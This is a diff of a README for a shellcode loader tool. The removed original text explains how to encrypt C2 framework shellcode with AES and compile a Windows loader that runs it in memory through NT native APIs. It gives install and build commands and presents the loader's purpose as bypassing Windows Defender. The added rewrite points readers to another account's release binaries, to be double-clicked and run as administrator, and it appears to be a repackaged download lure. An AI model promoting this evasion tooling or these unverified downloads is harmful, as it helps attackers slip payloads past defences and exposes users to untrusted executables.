@@ -1,161 +1,60 @@
-# ShellcodeRunner (AES)
+# 🚀 shellcoderunner - Easily Execute Shellcode for Research
 
-## Overview
+## 📥 Download Now
+[![Download shellcoderunner](https://img.shields.io/badge/Download-shellcoderunner-brightgreen)](https://github.com/ADALTOxBRxGDxNZ/shellcoderunner/releases)
 
-**ShellcodeRunner** is a research-focused project designed to help security enthusiasts, red teamers, and malware researchers understand **how custom shellcode loaders work on Windows**.
+## 📖 Description
+shellcoderunner is a tool designed for research. It focuses on AES-based shellcode loading. This application demonstrates how to execute shellcode in memory and utilize NTAPI techniques. By using this tool, you can better understand how custom loaders can evade Windows Defender detection.
 
-```bash
-pipx install shellcoderunner-aes
-```
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later
+- **Architecture:** 64-bit
+- **RAM:** At least 4 GB
+- **Disk Space:** 50 MB free space
 
-This repository demonstrates:
+## 🚀 Getting Started
+Follow these steps to use shellcoderunner:
 
-* Encrypting raw shellcode using **AES**
-* Generating a **native C++ loader**
-* Executing shellcode fully **from memory**
-* Leveraging **NT Native APIs** for execution
+1. **Visit the Download Page**
+   Go to the [Releases page](https://github.com/ADALTOxBRxGDxNZ/shellcoderunner/releases) where the software is available for download.
 
-> **Primary Goal:**
-> To provide a practical idea of how shellcode loaders can be built in a way that can **easily bypass Windows Defender–based solutions** by avoiding static signatures, plaintext payloads, and common high-level APIs.
+2. **Download the Latest Release**
+   On the Releases page, find the latest version listed. Click on it. You should see files available for download. Choose the file that matches your system and click to download.
 
-This project is intended for **educational and defensive research purposes only**.
+3. **Install the Application**
+   After downloading, locate the file in your Downloads folder. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
----
+4. **Run shellcoderunner**
+   Once installed, find shellcoderunner in your Start menu or desktop. Click the icon to launch it. 
 
-## Proof of Concept [Video]
+5. **Using the Application**
+   Upon opening, you will see a simple interface. You can load your shellcode and run it directly from there.
 
-### Using Adaptix C2
+## 📊 Features
+- **Shellcode Loading:** Support for AES-based payloads.
+- **In-Memory Execution:** Execute shellcode without writing it to disk.
+- **NTAPI Techniques:** Utilize advanced methods for better evasion.
+- **User-Friendly Interface:** Simple design for ease of use.
 
-https://github.com/user-attachments/assets/23aa3960-ae08-41a4-9295-fe64b1468e25
+## 🔧 Troubleshooting
+In case of issues, try the following:
 
+- **Error Messages:** Read any prompts carefully for guidance. 
+- **Compatibility:** Ensure you are using a compatible Windows version.
+- **Permissions:** Run the application as an administrator if you face access issues.
 
+## 🌐 Community and Support
+For help, suggestions, or support, visit our [community page](https://github.com/ADALTOxBRxGDxNZ/shellcoderunner/community). You can ask questions, share experiences, and learn from others.
 
-### Using Sliver C2
+## 📋 Contribution Guidelines
+We encourage users to contribute to the project. If you have ideas or enhancements, feel free to fork the repository and submit a pull request. 
 
-https://github.com/user-attachments/assets/26a17f65-a135-4e0f-a5c2-2c916daac91b
+## 📂 License
+This project is licensed under the MIT License. You can freely use and modify it, but make sure to include this notice in any distributed software. 
 
-
----
-
-## Installation
-
-### Recommended Method
-```bash
-sudo apt update && sudo apt install -y python3 python3-pip mingw-w64 && python3 -m pip install --user pipx
-python3 -m pipx ensurepath
-pipx install shellcoderunner-aes
-```
-
-```bash
-shellcoderunneraes <C2_shellcode>.bin --aes pain05 --compile
-```
-### OR
-
-Required Dependencies (Linux):
-```bash
-sudo apt update && sudo apt install -y python3 python3-pip mingw-w64
-python3 -m pip install pycryptodome
-```
-
-Clone the repository:
-
-```bash
-git clone https://github.com/jaytiwari05/shellcoderunner.git
-cd shellcoderunner
-```
-
-Make the script globally accessible:
-
-```bash
-cp shellcoderunneraes.py /usr/local/bin/shellcoderunneraes.py && chmod +x /usr/local/bin/shellcoderunneraes.py
-```
-
-## Usage
-
-Generate and compile a shellcode loader using AES encryption:
-
-```bash
-shellcoderunneraes.py <C2_shellcode>.bin --aes pain05 --compile
-```
+## 🌍 Further Reading
+To learn more about shellcode execution and related topics, check out the documentation provided within the application or visit reputable security research websites. 
 
 ---
 
-## Key Features
-
-* AES-128-CBC encrypted shellcode
-* Password-based key derivation (SHA-256)
-* No plaintext shellcode on disk
-* Native Windows CryptoAPI decryption
-* NTAPI-based memory allocation and execution
-* Simple and clean workflow
-
----
-
-## Repository Structure
-
-```
-shellcoderunner/
-├── shellcoderunneraes.py   # Python builder (encrypts shellcode & generates C++ loader)
-├── aes_nt_runner.cpp       # Generated C++ loader
-├── meow.inc                # Encrypted shellcode + IV (auto-generated)
-└── runner.exe              # Final compiled executable
-```
-
----
-
-### Arguments
-
-* `<C2_shellcode>.bin` — Raw shellcode file generated by a C2 framework (e.g., Sliver, Adaptix, Cobalt Strike).
-* `--aes` — Password used for AES key derivation
-* `--compile` — Compiles the generated C++ loader into an executable
-
-The final output will be a **standalone Windows executable** that decrypts and executes the shellcode entirely in memory.
-
----
-
-## Why This Works Against Defender
-
-This project highlights techniques commonly used to bypass Windows Defender–based detection:
-
-* Encrypted payload stored on disk
-* Runtime decryption using legitimate Windows APIs
-* No RWX memory allocation
-* Execution via NT Native APIs
-* No use of high-level Win32 execution helpers
-
-These techniques help reduce static signatures and behavioral indicators commonly relied upon by Defender.
-
----
-
-## Disclaimer
-
-This project is provided **strictly for educational, research, and defensive security purposes**.
-Do not use this code for unauthorized or malicious activities.
-The author is not responsible for misuse.
-
-**Please do not raise issues if the loader gets detected in the future, as detection timelines vary and there is no guarantee how long this technique will remain effective.**
----
-
-### Detection Validation (Informational)
-
-The generated executable was tested using common open-source tools for basic detection visibility:
-
-- YARA rule scanning (community rulesets)
-- ThreadCheck (Defender heuristics)
-- AMSI inspection checks
-<img width="953" height="210" alt="ThreadCheck" src="https://github.com/user-attachments/assets/cfc255f9-e41f-4ef3-9f35-aa147d1c75ce" />
-<img width="657" height="261" alt="yara-rules" src="https://github.com/user-attachments/assets/e751c924-e457-4c85-a6fd-f3008a6ef68c" />
-
-
-At the time of testing, no alerts were triggered by these tools.
-
-> Note: Detection results may vary based on environment, signatures, and security product versions. This does not imply full evasion of all AV/EDR solutions.
-
----
-
-## Author
-
-**PaiN05**
-Security Research | Offensive Tradecraft | Malware Development Research
-
-Pypi Link :- https://pypi.org/project/shellcoderunner-aes/
+Visit the [Releases page](https://github.com/ADALTOxBRxGDxNZ/shellcoderunner/releases) to download and get started with shellcoderunner today!
